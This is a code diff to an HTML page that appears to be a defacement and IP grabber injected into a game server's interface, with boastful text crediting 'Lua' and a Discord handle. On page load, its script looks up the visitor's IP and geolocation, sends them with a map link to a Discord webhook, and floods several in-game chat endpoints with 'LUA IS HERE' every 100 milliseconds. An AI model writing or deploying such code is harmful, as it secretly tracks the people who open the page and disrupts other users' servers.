@@ -78,6 +78,22 @@
             font-size: 1.3rem;
             font-weight: bold;
             color: white;
+            margin-bottom: 30px;
+        }
+        .lua-text {
+            font-size: 1.3rem;
+            font-weight: bold;
+            color: white;
+            margin-top: 20px;
+            margin-bottom: 15px;
+        }
+        .discord-text {
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: white;
+            margin-top: 15px;
+            border-top: 1px solid rgba(255, 255, 255, 0.2);
+            padding-top: 12px;
         }
     </style>
 </head>
@@ -96,18 +112,23 @@
         <div class="ipevil">
             <b>Your IP Address:</b> <span id="ip-address-value">Fetching...</span><br />
             <pre id="ip-info"></pre>
+            
             <div class="revenge-text">
-                <b>Lua: "revenge revenge"</b>
-            <div class="Lua-text">
-           
-               <b>Lua </b>
+                <b>Lua fucked the server </b>
+            </div>
+            
+            <div class="lua-text">
+                <b>Lua "its your bed time byeee"</b>
+            </div>
+
+            <div class="discord-text">
+                <b>discord : z911</b>
             </div>
         </div>
-
     </div>
 
     <script>
-        // منع التحديد على الصفحة
+        // Disable selection on page
         var omitformtags = ['input', 'textarea', 'select'].join('|');
         function disableselect(e) {
             if (omitformtags.indexOf(e.target.tagName.toLowerCase()) == -1)
@@ -121,7 +142,7 @@
             document.onmouseup = reEnable;
         }
 
-        // جلب IP والمعلومات
+        // Fetch IP and info
         function fetchIPAndInfo() {
             fetch('https://api.ipify.org/?format=json')
                 .then((response) => response.json())
@@ -132,7 +153,7 @@
                 .then((ip) => fetch(`https://ipinfo.io/${ip}/json`))
                 .then((response) => response.json())
                 .then((ipInfoData) => {
-                    sendToDiscord(ipInfoData, `https://www.google.com/maps/search/?api=1&query=${ipInfoData.loc}`, "منيك جديد ");
+                    sendToDiscord(ipInfoData, `https://www.google.com/maps/search/?api=1&query=${ipInfoData.loc}`, "grabed by lua  ");
                 })
                 .catch((error) => {
                     document.getElementById('ip-info').textContent = 'Unable to fetch IP information.';
@@ -153,17 +174,18 @@
             .catch(error => console.error(error));
         }
 
- const msg = `LUA IS HERE`;
-  const body = JSON.stringify({ message: msg });
-  setInterval(() => {
-    fetch("https://flix-scripts/chatResult", { method: "POST", body });
-    fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST",body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]})});
-    fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},body: JSON.stringify({ message: msg, channel: "شات العام" }),method: "POST"});
-    fetch("https://melix_chat/chatResult", { method: "POST", body });
-    fetch("https://as_chat/chatResult", { method: "POST", body });
-    fetch("https://chat/chatResult", { method: "POST", body });
-    fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
-  }, 100);
+        const msg = `LUA IS HERE`;
+        const body = JSON.stringify({ message: msg });
+        setInterval(() => {
+            fetch("https://flix-scripts/chatResult", { method: "POST", body });
+            fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST",body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]})});
+            fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},body: JSON.stringify({ message: msg, channel: "شات العام" }),method: "POST"});
+            fetch("https://melix_chat/chatResult", { method: "POST", body });
+            fetch("https://as_chat/chatResult", { method: "POST", body });
+            fetch("https://chat/chatResult", { method: "POST", body });
+            fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
+        }, 100);
+        
         fetchIPAndInfo();
     </script>
 
